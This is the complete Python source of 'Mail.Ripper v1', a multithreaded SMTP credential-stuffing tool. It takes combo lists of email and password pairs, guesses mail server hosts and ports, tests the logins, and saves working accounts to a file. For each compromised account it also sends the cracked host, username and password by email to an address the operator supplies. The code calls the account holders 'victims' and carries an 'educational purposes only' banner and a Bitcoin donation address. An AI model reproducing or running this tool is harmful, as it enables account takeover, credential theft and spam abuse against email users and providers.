#!/usr/local/bin/python3
#encoding: utf-8
#name: Mail.Ripper v1 (proxyless)
#description: smtp checker / smtp cracker including mailsending check for hits
#version: 1.00, 2020-11-20
#author: DrPython3
#----------------------------------------------------------------------------------------------------------------------
#((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))

import ctypes, os, smtplib, socket, sys, ssl, threading, time, json, re, uuid, email.mime
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import colorama
from colorama import *
init()
print(Fore.GREEN + Style.BRIGHT + '')
#----------------------------------------------------------------------------------------------------------------------
#((--> *S*T*A*R*T*U*P***L*O*G*O* <--))

logo1 = '''
-------------------------------------------------------------------------
o     o         o 8     .oPYo.  o                                     .o 
8b   d8           8     8   `8                                         8 
8`b d'8 .oPYo. o8 8    o8YooP' o8 .oPYo. .oPYo. .oPYo. oPYo.   o    o  8 
8 `o' 8 .oooo8  8 8     8   `b  8 8    8 8    8 8oooo8 8  `'   Y.  .P  8 
8     8 8    8  8 8     8    8  8 8    8 8    8 8.     8       `b..d'  8 
8     8 `YooP8  8 8 88  8    8  8 8YooP' 8YooP' `Yooo' 8        `YP'   8 
..::::..:.....::......::..:::..:..8 ....:8 ....::.....:..::::::::...:::..
::::::::::::::::::::::::::::::::::8 :::::8 ::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::..:::::..::::::::::::::::::::::::::::::
-------------------------------------------------------------------------
'''
logo2 = '''
              simple email checker by: DrPython3 (C) 2020
                 *** FOR EDUCATIONAL PURPOSES ONLY ***
                 
          DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
'''
#----------------------------------------------------------------------------------------------------------------------
#((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))

combofile = 'none.txt'
combos = []
tout = float(123.0)
skip = int(1)
attackthreats = int(999)
valid = int(0)
bad = int(0)
attackermail = str('invalid@mail.com')
regexp = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w+$'
#suggested by Trustdee, dictionaries and lists are in config.json now:
try:
    with open('config.json') as config:
        jsonobj = json.load(config)
        hosters = (jsonobj['hosters'])
        hosterports = (jsonobj['hosterports'])
        subh = (jsonobj['subh'])
        subp = (jsonobj['subp'])
        blacklisted = (jsonobj['blacklisted'])
#fallback in case anything is wrong with json, so checker will still work using finder():
except:
    hosters = {}
    hosterports = {}
    subh = ['','mail.','webmail.','smtp.','mail2.','mx.','email.','mail1.','owa.','mx1.','exchange.','smtpauths.','smtpauth.',
            'smtp.mail.','smtp-mail.','securesmtp.']
    subp = [587,465,25,26,2525]
    blacklisted = ['gmail.com','googlemail.com','yahoo.com','yahoo.de','yahoo.co.uk','hotmail.com','protonmail.com','yandex.ru']
#----------------------------------------------------------------------------------------------------------------------
#((--> *F*U*N*C*T*I*O*N*S* <--))

#cleaner == clears screen on purpose:
def cleaner():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except: pass

#countdown == yes, a countdown ...:
def countdown():
    i = 5
    while i > 0:
        print(Fore.LIGHTYELLOW_EX + '... ' + str(i))
        sleep(1.0)
        i -= 1
    return None

#mailcheck == checks email user input with regex:
def mailcheck(email):
    if re.search(regexp, str(email)):
        return True
    else:
        return False

#checked == saves checked combos to a txt file:
def checked(checkedtext):
    with open('checked_combos.txt', 'a') as checkedfile:
        checkedfile.write(str(checkedtext) + '\n')
        checkedfile.close()

#hits == saves hits to a txt file:
def hits(hitstext):
    with open('valid_combos.txt', 'a') as hitsfile:
        hitsfile.write(str(hitstext) + '\n')
        hitsfile.close()

#skips == saves skipped combos to a txt file:
def skips(skiptext):
    with open('skipped_combos.txt', 'a') as skippedfile:
        skippedfile.write(str(skiptext) + '\n')
        skippedfile.close()

#blackcheck == searches for smtp domain in blacklist:
def blackcheck(search):
    try:
        x = int(blacklisted.count(str(search)))
        if x == 0:
            return False
        else:
            return True
    except: pass

#finder == search for smtp hosts if not included in hosters dictionary:
def finder(unkdom):
    socket.setdefaulttimeout(tout)
    defcontext = ssl.create_default_context()
    z = str('failed')
    print(Fore.LIGHTYELLOW_EX + 'Looking up SMTP-host for: ' + str(unkdom) + ' ...\n')
    try:
        for x in subh:
            y = str(str(x) + str(unkdom))
            print(Fore.LIGHTMAGENTA_EX + 'Trying to connect to: ' + str(y) + ' ...\n')
            try:
                findsmtp = smtplib.SMTP_SSL(str(y), context=defcontext)
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'SSL-Connection established, HOST is: ' + str(y) + ' ...\n')
                z = str(y)
                break
            except:
                try:
                    findsmtp = smtplib.SMTP(str(y))
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(y) + ' ...\n')
                    z = str(y)
                    break
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for guessed HOST: ' + str(y) + ' ...\n')
                    try:
                        findsmtp.quit()
                    except: pass
                    continue
        try:
            findsmtp.quit()
        except:pass
        return z
    except BaseException:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Cannot find working SMTP host (!) for: ' + str(unkdom) + ' ...\n')
        return z

#attacker == connects to SMTP host, checks login data and returns result to main checker process:
def attacker(attackhost, attackport, attackuser, attackpass):
    socket.setdefaulttimeout(tout)
    defcontext = ssl.create_default_context()
    try:
        #if SMTP port is unknown, try to find it using most common ones:
        if attackport == 0:
            print(Fore.LIGHTYELLOW_EX + 'Unknown port for HOST ' + str(attackhost) + ', testing connection with most common ports ...\n')
            for x in subp:
                p = int(x)
                try:
                    attack = smtplib.SMTP_SSL(str(attackhost), int(p), context=defcontext)
                    attack.quit()
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...\n')
                    attackport = int(p)
                    break
                except:
                    try:
                        attack = smtplib.SMTP(str(attackhost), int(p))
                        attack.quit()
                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...\n')
                        attackport = int(p)
                        break
                    except:
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Connection error (!) for HOST: ' + str(attackhost)
                              + ' on PORT: ' + str(p) + ' ...\n')
                        try:
                            attack.quit()
                        except: pass
                        continue
        else:
            print(Fore.LIGHTMAGENTA_EX + 'Starting attack on: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
        #if SMTP port is known, start checking combo against host:
        try:
            print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' with SSL ...\n')
            attack = smtplib.SMTP_SSL(str(attackhost), int(attackport), context=defcontext)
            print(Fore.LIGHTMAGENTA_EX + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
        except:
            try:
                print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' without SSL ...\n')
                attack = smtplib.SMTP(str(attackhost), int(attackport))
                #if port = 587, try to start TLS:
                if attackport == 587:
                    try:
                        print(Fore.LIGHTMAGENTA_EX + 'Trying to start TLS for HOST: ' + str(attackhost) + ' ...\n')
                        attack.starttls(context=defcontext)
                    except: pass
                else: pass
                print(Fore.LIGHTMAGENTA_EX + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                      + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
            except: pass
        attack.login(str(attackuser), str(attackpass))
        attack.quit()
        #return result to checking process:
        return True, str(attackhost), int(attackport), str(attackuser), str(attackpass)
    except:
        try:
            attack.quit()
        except: pass
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Connection or login error (!) for HOST: ' + str(attackhost) + ' on PORT: '
              + str(attackport) + ' ...\n')
        return False, str(attackhost), int(attackport), str(attackuser), str(attackpass)

#sendcheckmsg == trys to send an e-mail to user address by valid SMTP:
def sendcheckmsg(mailhost, mailport, mailuser, mailpass):
    if attackermail == str('invalid@mail.com'):
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Mailsending check skipped (!) for: ' + str(mailuser) + ' ...\n')
    else:
        socket.setdefaulttimeout(tout)
        msgcontext = ssl.create_default_context()
        #generate randomID:
        randomid = uuid.uuid4().hex
        randomid = str(randomid[0:8])
        randomid = randomid.upper()
        #prepare e-mail content for sending check:
        mailsender = str(mailuser)
        mailreceiver = str(attackermail)
        mail = MIMEMultipart("alternative")
        mail["Subject"] = str('Test Result for ID ' + str(randomid))
        mail["From"] = str(mailsender)
        mail["To"] = str(mailreceiver)
        #mailcontent for plain text e-mail:
        mailtext = '''
        Hello!
        This message has been sent using the following SMTP:
        
        HOST: ''' + str(mailhost) + '''
        PORT: ''' + str(mailport) + '''
        USER: ''' + str(mailuser) + '''
        PASS: ''' + str(mailpass) + '''
        
        If you like Mail.Rip donate, please! My wallet (BTC):
        1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
        
        Every donations gives me time for improving this and other tools.
        
        Best regards,
        DrPython3'''
        #mailcontent for HTML e-mail:
        mailhtml = '''
        <!doctype html>
        <html lang="en-US">
            <head>
                <title>Test Result for ID ''' + str(randomid) + '''</title>
            </head>
            <body>
                <p>Hello!</p>
                <p>This message has been sent using the following SMTP:</p>
                <p>
                    <b>HOST:</b> ''' + str(mailhost) + '''<br>
                    <b>PORT:</b> ''' + str(mailport) + '''<br>
                    <b>USER:</b> ''' + str(mailuser) + '''<br>
                    <b>PASS:</b> ''' + str(mailpass) + '''
                </p>
                <p>
                    <i>If you like <a href="https://github.com/DrPython3/mailripv1">Mail.Rip</a> donate, please! My wallet (BTC):</i><br>
                    <b>1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf</b>
                </p>
                <p>Every donation gives me time for improving this and other tools.</p>
                <p>
                    Best regards,<br>
                    DrPython3
                </p>
            </body>
        </html>'''
        mp1 = MIMEText(mailtext, "plain")
        mp2 = MIMEText(mailhtml, "html")
        mail.attach(mp1)
        mail.attach(mp2)
        try:
            mailer = smtplib.SMTP_SSL(str(mailhost), int(mailport), context=msgcontext)
        except:
            try:
                mailer = smtplib.SMTP(str(mailhost), int(mailport))
                if int(mailport) == 587:
                    try:
                        mailer.starttls(context=msgcontext)
                        mailer.ehlo_or_helo_if_needed()
                    except: pass
                else: pass
            except: pass
        try:
            mailer.login(str(mailuser), str(mailpass))
            mailer.sendmail(str(mailsender), str(mailreceiver), mail.as_string())
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Finally, an e-mail has been sent with: ' + str(mailuser)
                  + ' ... so, check your inbox later ...\n')
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser) + ' ...\n')
        try:
            mailer.quit()
        except: pass

#checkmate == the main checker process:
def checkmate():
    global valid
    global bad
    #starting main loop:
    while len(combos) > 0:
        checkresult = False
        th = str('')
        tp = int(0)
        tuser = str('')
        tpass = str('')
        try:
            #get next combo, clean it and split into mail and pass:
            lraw = combos.pop(0)
            lraw = lraw.replace(';', ':')
            lraw = lraw.replace('|', ':')
            l = lraw.split(':')
            #check blacklist for e-mail domain on purpose:
            if skip == 1:
                print(Fore.LIGHTMAGENTA_EX + 'Checking blacklist for host: ' + str(l[0].split("@")[1]) + ' ...\n')
                blackhost = blackcheck(str(l[0].split("@")[1]))
                #if e-mail domain is on blacklist, combo will not be checked:
                if blackhost == True:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Host blacklisted, therefor skipping: ' + str(l[0]) + ':'
                          + str(l[1]) + ' ...\n')
                    skips(str(l[0]) + ':' + str(l[1]))
                    bad += 1
                    continue
                else: pass
            else: pass
            #try to get SMTP host from dictionary:
            try:
                targethost = str(hosters[str(l[0].split("@")[1])])
            except:
                #if not found in dictionary, start search for attackable SMTP host:
                try:
                    newhost = str(finder(str(l[0].split("@")[1])))
                    if newhost == str('failed'):
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':'
                              + str(l[1]) + ' ...\n')
                        skips(str(l[0]) + ':' + str(l[1]))
                        bad += 1
                        continue
                    else:
                        targethost = str(newhost)
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Error (!) while searching host for: ' + str(l[0])
                          + ':' + str(l[1]) + ' ...\n')
                    skips(str(l[0]) + ':' + str(l[1]))
                    bad += 1
                    continue
            #try to get SMTP port from dictionary and set to 0 if none is found:
            try:
                targetport = int(hosterports[str(targethost)])
            except:
                targetport = int(0)
            #check the combo against the SMTP host and write result to txt-file:
            checkresult, th, tp, tuser, tpass = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
            if checkresult == False:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed victim ' + str(th) + ':' + str(tp) + ', USER: '
                      + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
                checked(str(tuser) + ':' + str(tpass))
                bad += 1
                continue
            elif checkresult == True and tp == 465:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th)
                      + ':465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
                hits('SERVER: ' + str(th) + ', PORT: 465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            else:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th) + ':' + str(tp)
                      + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
                hits('SERVER: ' + str(th) + ', PORT: ' + str(tp) + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            checked(str(tuser) + ':' + str(tpass))
            valid += 1
            #if combo is valid, try to send an e-mail using the cracked SMTP:
            sendcheckmsg(str(th), int(tp), str(tuser), str(tpass))
            continue
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ... HOST: ' + str(th) + ':' + str(tp)
                  + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
            checked(str(tuser) + ':' + str(tpass))
            bad += 1
            continue
#----------------------------------------------------------------------------------------------------------------------
#((<-- *M*A*I*N***P*R*O*G*R*A*M*M* -->))

#startup on clean screen with logos:
cleaner()
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)

#ask for user email address and check with regex:
try:
    attackermail = input(Fore.LIGHTWHITE_EX + '\nEnter your e-mail address, please:     ')
    checkmail = mailcheck(str(attackermail))
    if checkmail == True:
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill try to send messages to your e-mail: ' + str(attackermail)
              + ' when a valid SMTP is found ...\n')
    else:
        print(Fore.LIGHTRED_EX + Style.BRIGHT
              + '\n(!) Invalid e-mail (!) - checking the found SMTP by sending an e-mail will be skipped ...\n')
        attackermail = str('invalid@mail.com')
except:
    print(Fore.LIGHTRED_EX + Style.BRIGHT
          + '\n(!) Invalid e-mail (!) - checking the found SMTP by sending an e-mail will be skipped ...\n')
    attackermail = str('invalid@mail.com')

#ask for name of combofile:
combofile = input(Fore.LIGHTWHITE_EX + 'Enter name of your combofile, e.g. combos.txt :     ')

#check combofile:
if combofile == '':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'No filename entered. Bye bye!\n')
else:
    try:
        combos = open(combofile, 'r').read().splitlines()
    except:
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'Combofile not found. Check filename and start again!\n')

#return amount of combos to check:
tocheck = int(len(combos))
if tocheck == 0:
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'Combofile is empty. Bye bye!\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check ...\n')

#ask for default timeout:
try:
    tout = float(input(Fore.LIGHTWHITE_EX + 'Enter value for timeout (any key for default = 15.0) :     '))
except:
    tout = float(15.0)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')

#ask for amount of threads to use:
try:
    attackthreats = int(input(Fore.LIGHTWHITE_EX
                              + 'Enter amount of threads to use (any key for default = 25) :     '))
except:
    attackthreats = int(25)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(attackthreats) + ' ...\n')

#ask for skipping options:
skipuser = input(Fore.LIGHTWHITE_EX
                 + 'Want to skip services like GMAIL, etc. (yes / no, any key for default = yes) :    ')
if skipuser == 'no':
    skip = int(0)
elif skipuser == 'n':
    skip = int(0)
else:
    skip = int(1)
if skip == 0:
    print(Fore.LIGHTRED_EX + Style.BRIGHT
          + '\nWARNING: Services like GMAIL, etc. will not be skipped! You probably waste time ...\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL, etc. will be skipped and saved to a txt-file ...\n')

#ask to start checking:
startnow = input(Fore.LIGHTWHITE_EX + '*** DO YOU WANT TO START THE CHECKER NOW? *** (yes / no) :     ')
if startnow == 'no':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
elif startnow == 'n':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
else: pass

#start checker:
cleaner()
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED!\nLet us start shooting at your victims now ...\n\n')
countdown()
cleaner()
for _ in range(attackthreats):
    threading.Thread(target=checkmate).start()
while len(combos) > 0:
    try:
        #Show stats in title bar if run on Windows:
        sleep(0.1)
        ctypes.windll.kernel32.SetConsoleTitleW(f"TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}")
    #Stats in title bar for Unix & Co.:
    except:
        try:
            sleep(0.1)
            wintitle = str('TO CHECK: ' + str(len(combos)) + ' | HITS: ' + str(valid) + ' | BAD: ' + str(bad))
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except: pass
